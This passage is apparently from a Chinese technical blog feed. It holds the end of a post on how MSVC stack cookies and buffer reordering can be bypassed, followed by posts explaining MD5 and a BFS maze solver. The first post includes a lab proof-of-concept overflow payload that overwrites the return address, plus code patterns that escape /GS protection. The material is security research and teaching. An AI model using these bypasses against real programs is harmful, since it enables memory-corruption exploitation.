class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,18 </span><br><span class="line">mov dword ptr ss:[ebp-8],1 </span><br><span class="line">mov dword ptr ss:[ebp-4], </span><br><span class="line">mov eax,dword ptr ss:[ebp+C] </span><br><span class="line">push eax </span><br><span class="line">mov ecx,dword ptr ss:[ebp+8] </span><br><span class="line">push ecx </span><br><span class="line">lea edx,dword ptr ss:[ebp-18] </span><br><span class="line">push edx </span><br><span class="line">call  </span><br><span class="line">add esp,C </span><br><span class="line">mov eax,dword ptr ss:[ebp-4] </span><br><span class="line">mov ecx,dword ptr ss:[ebp-8] </span><br><span class="line">mov dword ptr ds:[eax],ecx </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure><p>仔细对比上图34中的汇编代码和图30中的原始（安全）汇编代码，大家就会发现，从这个函数中删除的可不仅仅是栈Cookie检查。事实上，MSVC已经完全重新排列了栈上的变量，使其与正常规则一致，因此将Buf数组放在了内存的最低区域（EBP – 0x18）。因此，这个函数现在很容易通过栈溢出导致局部变量损坏。</p><p>在用多种不同的变量类型（包括其他数组类型）测试了同样的逻辑后，我得出如下结论：MSVC对数组和结构体（GS缓冲区）有一个特殊的规则，即总是将它们放在内存的最高区域，以防止编译后的函数的局部变量因栈溢出而遭到破坏。了解到这些信息后，我开始尝试评估这个安全机制的复杂程度，并设法通过边缘案例（edge cases）来绕过它。我发现了多个，下面是我认为最显著的例子。</p><p>首先，让我们来看看如果memcpy被移除会发生什么情况。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Overflow</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="type">uint8_t</span> Buf[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1 = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line"> </span><br><span class="line">    *pdwVar2 = dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>我们希望MSVC的安全排序规则总是将数组放置在内存的最高区域，以为函数提供安全保护，然而汇编代码表明，事情并非如此。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,18 </span><br><span class="line">xor eax,eax </span><br><span class="line">mov dword ptr ss:[ebp-18],eax </span><br><span class="line">mov dword ptr ss:[ebp-14],eax </span><br><span class="line">mov dword ptr ss:[ebp-10],eax </span><br><span class="line">mov dword ptr ss:[ebp-C],eax </span><br><span class="line">mov dword ptr ss:[ebp-8],1 </span><br><span class="line">mov dword ptr ss:[ebp-4], </span><br><span class="line">mov ecx,dword ptr ss:[ebp-4] </span><br><span class="line">mov edx,dword ptr ss:[ebp-8] </span><br><span class="line">mov dword ptr ds:[ecx],edx </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure><p>如您所见，MSVC已经从函数中删除了栈Cookie。同时，MSVC还将Buf数组放在了内存的最低区域，这违背了其典型的安全策略；如果缓冲区未被引用，它将不考虑GS缓冲区的安全重排序规则。这样就提出了一个有趣的问题：何谓引用？令人惊讶的是，答案并不像我们所期望的那样（引用就是函数中对变量的任何使用）。针对某些类型的变量使用并不能算作引用，因此不会影响变量的排序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Test</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="type">uint8_t</span> Buf[<span class="number">16</span>]&#125;; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1 = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line"> </span><br><span class="line">    Buf[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>; </span><br><span class="line">    Buf[<span class="number">1</span>] = <span class="string">&#x27;B&#x27;</span>; </span><br><span class="line">    Buf[<span class="number">2</span>] = <span class="string">&#x27;C&#x27;</span>; </span><br><span class="line">    *pdwVar2 = dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>在上面的例子中，我们希望Buf被放置在内存的第一个（最高）槽（slot）中，因为它被引用了三次，而dwVar1和pdwVar2各只被引用了两次。这个函数的汇编代码与此相矛盾。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,18 </span><br><span class="line">mov dword ptr ss:[ebp-8],1 </span><br><span class="line">mov dword ptr ss:[ebp-4], </span><br><span class="line">mov eax,1 </span><br><span class="line">imul ecx,eax,0 </span><br><span class="line">mov byte ptr ss:[ebp+ecx-18],41 </span><br><span class="line">mov edx,1 </span><br><span class="line">shl edx,0 </span><br><span class="line">mov byte ptr ss:[ebp+edx-18],42 </span><br><span class="line">mov eax,1 </span><br><span class="line">shl eax,1 </span><br><span class="line">mov byte ptr ss:[ebp+eax-18],43 </span><br><span class="line">mov ecx,dword ptr ss:[ebp-4] </span><br><span class="line">mov edx,dword ptr ss:[ebp-8] </span><br><span class="line">mov dword ptr ds:[ecx],edx </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure><p>尽管Buf是一个数组，而且比其他任何一个局部变量使用得更多，但是，它却被保存在栈内存的最低处EBP–0x18。上面的汇编代码的另一个有趣的细节是，MSVC没有给上面的函数添加安全Cookie检查。这就意味着，该返回地址仍会受到经典栈溢出以及任意写入漏洞的影响。</p><p>越界写入漏洞</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">uint8_t</span> Exploit[] = </span><br><span class="line">    <span class="string">&quot;AAAAAAAAAAAAAAAA&quot;</span>  <span class="comment">// 16 bytes for buffer length </span></span><br><span class="line">    <span class="string">&quot;\xde\xc0\xad\xde&quot;</span>  <span class="comment">// New EIP 0xdeadc0de </span></span><br><span class="line">    <span class="string">&quot;\x1c\xff\x19\x00&quot;</span>; <span class="comment">// 0x0019FF1c </span></span><br><span class="line"> </span><br><span class="line"><span class="type">uint32_t</span> gdwGlobalVar = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OverflowOOBW</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123; </span><br><span class="line">    <span class="type">uint8_t</span> Buf[<span class="number">16</span>]; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1 = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> dwX = <span class="number">0</span>; dwX &lt; dwInputBufSize; dwX++) &#123; </span><br><span class="line">    Buf[dwX] = pInputBuf[dwX]; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    *pdwVar2 = dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>编译并执行上面的代码会导致一个没有栈Cookies和没有进行安全的变量排序的函数，这样的话，攻击者就可以通过精确覆盖0x0019FF1c处的返回地址来劫持EIP（在本例中，我已经禁用了ASLR）。</p><p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/Picture47.png" alt="img"></p><p>根据这些实验，我们可以得出如下所示的结论：</p><ol><li>MSVC中存在一个安全漏洞：错误地评估了一个函数对栈溢出攻击的潜在敏感性。</li><li>这个安全漏洞源于MSVC使用某种形式的内部引用次数来决定变量顺序，而当一个变量的引用次数为零时，它被排除在常规的安全排序和栈Cookie安全缓解措施之外（即使它是一个GS缓冲区）。</li><li>按索引读&#x2F;写数组不计入引用次数。因此，以这种方式访问数组的函数将缺乏针对栈溢出漏洞的保护。</li></ol><p>对于可能无法适当防止栈溢出的代码模式，我还有几个其他的想法，首先是结构体&#x2F;类的概念。虽然函数栈帧内的变量排序没有标准化或约定俗成（完全由编译器决定），但对于结构体来说，情况就不一样了；编译器必须精确地遵循源代码中声明变量的顺序。因此，如果一个结构体中包含一个数组，后面还有额外的变量，这些变量就无法安全地重新排序，因此，可能会因溢出而被破坏。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">MyStruct</span> &#123; </span><br><span class="line">    <span class="type">char</span> Buf[<span class="number">16</span>]; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1; </span><br><span class="line">    <span class="type">uint32_t</span> *pdwVar2; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OverflowStruct</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">MyStruct</span> TestStruct = &#123; <span class="number">0</span> &#125;; </span><br><span class="line">    TestStruct.dwVar1 = <span class="number">1</span>; </span><br><span class="line">    TestStruct.pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line">    <span class="built_in">memcpy</span>(TestStruct.Buf, pInputBuf, dwInputBufSize); </span><br><span class="line">    *TestStruct.pdwVar2 = TestStruct.dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>上面用于结构体的概念同样也适用于C++类，前提是它们被声明为局部变量并在栈上分配内存空间。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123; </span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    <span class="type">char</span> Buf[<span class="number">16</span>]; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OverflowClass</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123; </span><br><span class="line">    MyClass TestClass; </span><br><span class="line">    TestClass.dwVar1 = <span class="number">1</span>; </span><br><span class="line">    TestClass.pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line">    <span class="built_in">memcpy</span>(TestClass.Buf, pInputBuf, dwInputBufSize); </span><br><span class="line">    *TestClass.pdwVar2 = TestClass.dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>当涉及到类时，一个额外的攻击手法是破坏其vtable指针。这些vtable包含指向可执行代码的其他指针，这些可执行代码可以在RET指令之前通过被破坏的类的方法进行调用，从而提供了一种通过破坏局部变量来劫持EIP的新方法，而无需使用任意写入原语。</p><p>最后一个容易被局部变量破坏的代码模式的例子是使用运行时栈分配函数，如_alloca。由于这类函数的内存分配过程，是在函数的栈帧已经建立后，通过减去ESP来实现的，因此，这类函数分配的内存将始终处于较低的栈内存中，所以无法重新排序或免受此类攻击的威胁。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">OverflowAlloca</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123; </span><br><span class="line">    <span class="type">uint32_t</span> dwValue = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pgdwGlobalVar = &amp;gdwGlobalVar; </span><br><span class="line">    <span class="type">char</span>* Buf = (<span class="type">char</span>*)_alloca(<span class="number">16</span>); </span><br><span class="line">    <span class="built_in">memcpy</span>(Buf, pInputBuf, dwInputBufSize); </span><br><span class="line">    *pgdwGlobalVar = dwValue; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>请注意，尽管上面的函数中没有数组，但MSVC足够聪明，它知道只要使用了_alloca函数就有必要在生成的函数代码中放入栈Cookie。</p><p>这里讨论的技术代表了一种现代Windows的栈溢出的攻击面，到目前为止，还没有明确的安全缓解措施。然而，它们的可靠利用依赖于这里讨论的特定代码模式以及（在任意写入的情况下）一个链式内存泄漏原语。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>对于栈溢出漏洞，虽然现代的操作系统已经提供了许多防御机制，但在今天的Windows应用程序中仍然存在并且可被利用。如果存在非Safeseh模块，那么利用这种溢出漏洞就比较容易，因为还没有哪种默认的安全缓解机制强大到可以防止局部变量破坏而导致的任意写入攻击。就目前来说，防御这类攻击的最强机制是ASLR，为了绕过这种机制，攻击者需要借助于非ASLR模块或内存泄漏漏洞。正如我们在这篇文章中所展示的那样，非Safeseh模块和非ASLR模块在如今的Windows 10系统以及许多第三方应用程序中仍不乏足迹。</p><p>与过去相比，尽管栈溢出漏洞的利用技术变得愈加复杂，但与堆中的其他内存破坏类型的漏洞相比，栈溢出是最容易理解的一个。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MD5</title>
      <link href="/2023/04/01/MD5/"/>
      <url>/2023/04/01/MD5/</url>
      
        <content type="html"><![CDATA[<h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h1><p>MD5是一种哈希算法，任意长度的输入经过处理后输出为128位的信息，且尽量使结果不冲突和信息不可逆。MD5以512位为一个分组处理输入，每个分组分成16个32位的子分组，经过处理后，输出四个32位分组，这四个32位分组级联后生成一个128位的MD5值</p><h2 id="MD5的特点"><a href="#MD5的特点" class="headerlink" title="MD5的特点"></a>MD5的特点</h2><p>单向散列算法：将一种任意长度的消息数据压缩到某一固定长度，该过程是不可逆的。</p><p> MD5 Message Digest Algorithm 是对任意长度的消息进行运算，产生一个128位的消息摘要。</p><p> 压缩性:任意长度的数据，算出的MD5值长度都是固定的。</p><p> 容易计算:从原数据计算出MD5值很容易。</p><p> 抗修改性:对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。</p><p> 强抗碰撞:已知原数据和其MD5值，想找到一个具有相同MD5值的数据(即伪造数据)是非常困难的。</p><p>MD5的作用是让大容量信息在用数字签名软件签署私人密钥前被”压缩”成一种保密的格式(就是把一个任意长度的字节串变换成一定长的十六进制数字串)。</p><p>在内存中是小端序存储</p><p>将原始数据每512bits为一个分组 (这就是前面要求填充到512整数倍的原因)，对每组分别进行处理</p><h2 id="操作过程"><a href="#操作过程" class="headerlink" title="操作过程"></a>操作过程</h2><p>数据末尾填充0x80</p><p>计算原始数据的长度</p><p>用零填充直到数据的字节数是64的倍数为止</p><p>把数据进行分组一组为64(512位)个字节 进行计算最终获得一个16个字节的MD5码</p><h2 id="计算过程"><a href="#计算过程" class="headerlink" title="计算过程"></a>计算过程</h2><p>1.进行组一数据的计算<br> 定义临时变量并赋值<br> a &#x3D; A; b &#x3D; B; c &#x3D; C; d &#x3D; D            &#x2F;&#x2F; 1 2 3 4</p><p> 2.计算a的值                    &#x2F;&#x2F;4 10 2 3<br> a &#x3D; (a + F + K[i] + M[g]) &lt;&lt; s[i]) + b;</p><p> 3.交换数据<br> b &#x3D; a<br> c &#x3D; b<br> d &#x3D; c<br> a &#x3D; d</p><p> 循环2.3两个步骤64次</p><p> 4.计算<br> A &#x3D; A + a;B &#x3D; B + b;C &#x3D; C + c;D &#x3D; D + d;</p><p> 5.跟新1.中a，b，c，d计算组二数据</p><p>当完成最后一组数据的计算获得 A；B；C；D以小端序组合获得最终16个字节就是MD5</p><p>如：A1A2A3A4 B1B2B3B4 C1C2C3C4 D1D2D3D4</p><p>A4A3A2A1B4B3B2B1C4C3C2C1D4D3D2D1</p><p>共循环64次</p><p>F的计算<br> 0-15<br> F &#x3D; (b&amp;c)|((<del>b)&amp;d)<br> 16-31<br> F &#x3D; (d&amp;b)|((</del>d)&amp;c)<br> 32-47<br> F &#x3D; b^c^d<br> 48-63<br> F &#x3D; c^(b|(~d))</p><p>K[i]的计算<br> 这是一个64个常量组成的数组在循环过程中依次获取<br> S[i]的计算<br> 这是一个64(每组都乘4)个常量组成的数组在循环过程中依次获取</p><p>M[g]的计算<br> 0-15<br> 从原始数据的第i个4个字节(小端序)<br> 39 31 31 4d 61 6f 48 61 69 80<br> 第一次使用<br> 4d 31 31 39<br> 第二次使用<br> 61 48 6f 41<br> 16-31<br> 从原始数据的第(5<em>i+1)%16个4个字节(小端序)<br> 32-47<br> 从原始数据的第(3</em>i+5)%16个4个字节(小端序)<br> 48-63<br> 从原始数据的第(7*i)%16个4个字节(小端序)</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BFS</title>
      <link href="/2023/04/01/BFS/"/>
      <url>/2023/04/01/BFS/</url>
      
        <content type="html"><![CDATA[<h1 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h1><h2 id="解决迷宫问题"><a href="#解决迷宫问题" class="headerlink" title="解决迷宫问题"></a>解决迷宫问题</h2><h3 id="迷宫问题"><a href="#迷宫问题" class="headerlink" title="迷宫问题"></a>迷宫问题</h3><p>Crawling in process… Crawling failed Time Limit:1000MS    Memory Limit:65536KB     64bit IO Format:%I64d &amp; %I64u<br>Submit Status<br>Description</p><p>定义一个二维数组：</p><p>int maze [5] [5] &#x3D; {</p><p> 0, 1, 0, 0, 0,</p><p> 0, 1, 0, 1, 0,</p><p> 0, 0, 0, 0, 0,</p><p> 0, 1, 1, 1, 0,</p><p> 0, 0, 0, 1, 0,</p><p>};</p><p>它表示一个迷宫，其中的1表示墙壁，0表示可以走的路，只能横着走或竖着走，不能斜着走，要求编程序找出从左上角到右下角的最短路线。      </p><p>输入</p><p>一个5 × 5的二维数组，表示一个迷宫。数据保证有唯一解。      </p><p>输出</p><p>左上角到右下角的最短路径</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>使用结构体来保存横纵坐标即(x,y)，输出没要求距离长度，定义一个step保存长度也可以</p><p>创建一个队列 queue<xxx> q;</xxx></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(q不为空)&#123;</span><br><span class="line"><span class="keyword">if</span>(到达右下角)&#123;</span><br><span class="line">    输出或是退出</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>()&#123;</span><br><span class="line">         枚举四个方向  合适的就入队</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">q.<span class="built_in">pop</span>();  <span class="comment">//出队列</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如何输出路径呢？</p><p>这里我们使用一个 print() 函数， 在函数内 递归调用 print()函数，直到为左上角就输出，</p><p>怎么调用前一个呢？</p><p>我们可以再创建一个结构体的二维数组，每个对应位置存放的是，它爸爸的x,y坐标</p><p>Step pre[5] [5];</p><p>在 q.push(); 的时候 pre[nx] [ny].x &#x3D; s.x,pre[nx] [ny].y &#x3D; s.y;</p><p>这样pre[][] 当前对应的[nx] [ny]，就应该存放 它爸爸的x,y</p><p>输出：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x == <span class="number">0</span> &amp;&amp; y == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;(0, 0)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">print</span>(pre[x] [y].x,pre[x] [y].y);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;(%d, %d)\n&quot;</span>,x,y);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Step</span>&#123;</span><br><span class="line"><span class="type">int</span> x,y;</span><br><span class="line"><span class="type">int</span> steps;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> a[<span class="number">5</span>][<span class="number">5</span>],book[<span class="number">5</span>][<span class="number">5</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> Next[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line">queue&lt;Step&gt; q;</span><br><span class="line">Step pre[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x==<span class="number">0</span>&amp;&amp;y==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(0, 0)\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(pre[x][y].x,pre[x][y].y);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(%d, %d)\n&quot;</span>,x,y);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">Step nd;</span><br><span class="line">    nd.x=<span class="number">0</span>,nd.y=<span class="number">0</span>,nd.steps=<span class="number">0</span>; book[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    q.<span class="built_in">push</span>(nd);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">Step s = q.<span class="built_in">front</span>();</span><br><span class="line"><span class="keyword">if</span>(s.x == <span class="number">4</span> &amp;&amp; s.y == <span class="number">4</span>)&#123;</span><br><span class="line"><span class="built_in">print</span>(<span class="number">4</span>,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="type">int</span> nx = s.x + Next[i][<span class="number">0</span>], ny = s.y + Next[i][<span class="number">1</span>], step = s.steps+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>((nx&lt;=<span class="number">4</span>&amp;&amp;nx&gt;=<span class="number">0</span>) &amp;&amp; (ny&lt;=<span class="number">4</span>&amp;&amp;ny&gt;=<span class="number">0</span>) &amp;&amp; book[nx][ny]==<span class="number">0</span> &amp;&amp; a[nx][ny]==<span class="number">0</span>)&#123;</span><br><span class="line">Step p; p.x=nx,p.y=ny,p.steps=step;</span><br><span class="line">book[nx][ny] = <span class="number">1</span>; pre[nx][ny].x = s.x,pre[nx][ny].y = s.y;</span><br><span class="line">q.<span class="built_in">push</span>(p);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)</span><br><span class="line">        cin&gt;&gt;a[i][j];</span><br><span class="line"><span class="built_in">bfs</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="学习代码"><a href="#学习代码" class="headerlink" title="学习代码"></a>学习代码</h2><p>一般来说，是不需要输出图像的。这时，代码可以简化，更便于学习</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 